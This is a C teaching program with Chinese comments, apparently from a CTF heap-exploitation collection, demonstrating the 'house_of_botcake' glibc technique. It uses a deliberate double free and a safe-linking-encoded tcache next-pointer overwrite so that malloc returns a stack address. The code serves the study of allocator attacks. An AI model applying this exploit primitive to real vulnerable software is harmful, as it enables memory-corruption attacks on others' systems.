/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_botcake
 * 文件标注范围：2.43
 * 模拟漏洞：一次 UAF，用来让同一个 chunk 先进 unsorted bin，再进 tcache。
 * 核心流程：先填满 tcache，把 victim 释放进 unsorted bin，让它和前一个
 *   chunk 合并；这时腾出一个 tcache 槽位，再对 victim 做第二次 free，
 *   这样就形成了大小不同的两份重叠管理。
 * 成功判据：覆盖 victim->next 之后，tcache poisoning 返回 target。
 *   2.32 起 next 字段必须按 safe-linking 编码，本文件到 2.43 仍然可用。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>

int main()
{
    /*
     * Botcake 绕过的是提交 bcdaad2 引入的 tcache double-free key 检查：
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * 思路是先让 victim 进入 unsorted bin，再释放它的前一个 chunk，二者
     * 合并成一个更大的 free chunk；这样 victim 原来的地址虽然已经"埋"在
     * 这个大 chunk 内部，但腾出一个 tcache 槽后仍能再次对它调用 free。
     * 于是同一段内存同时被当成大 unsorted chunk 和 tcache entry 管理，
     * 攻击者就可以通过这个重叠区域改写 tcache 的 next 字段。
     * 如果 glibc 没有这个 key 检查，直接连续两次 free 就够了，不需要先
     * 构造这个重叠。手法名称由 @anton00b 与 @subwire 提出。
     *
     * 2.43 把 tcache 每个尺寸的槽数从 7 改成了 16，因此这里要用 0x10 个
     * 填充块才能填满 tcache，比 2.32～2.42 分支多用了 9 个。
     */

    // 关闭 stdio 缓冲，避免 _IO_FILE 的隐式分配打乱关键的相邻 chunk 布局。
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // 这里只依赖 double free，最终目标是让 malloc 返回一个栈地址。

    // 栈上数组是我们要伪造分配到的目标；实际 CTF 里可以换成 hook、对象或
    // 其他任意可写地址。
    intptr_t stack_var[4];

    // 依次分配：tcache 填充块、前一个 chunk（prev）、victim（a），
    // 以及一个防止和后面内存合并的保护块。
    intptr_t *x[0x10];
    for(int i=0; i<0x10; i++){
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);

    intptr_t *a = malloc(0x100);

    malloc(0x10);

    // 先填满 tcache，再释放 a 和 prev；二者会向前合并成一个覆盖 a 的
    // 大 unsorted chunk。
    for(int i=0; i<0x10; i++){
        free(x[i]);
    }
    free(a);

    free(prev);

    malloc(0x100);
    /* 漏洞模拟开始/结束 */
    free(a); // 漏洞触发点：a 此时已经包含在那个大的 free chunk 里，
             // 再次释放它会把这段内部地址送进 tcache。
    /* 漏洞模拟开始/结束 */

    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10);
    // glibc 2.32 起，safe-linking 要求按 victim 地址所在页号编码 next；
    // 这里用已知的 a 地址算出加密后的密文写进去。
    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^ (long)stack_var;

    malloc(0x100);

    intptr_t *target = malloc(0x100);
    target[0] = 0xcafebabe;

    assert(stack_var[0] == 0xcafebabe);
    return 0;
}
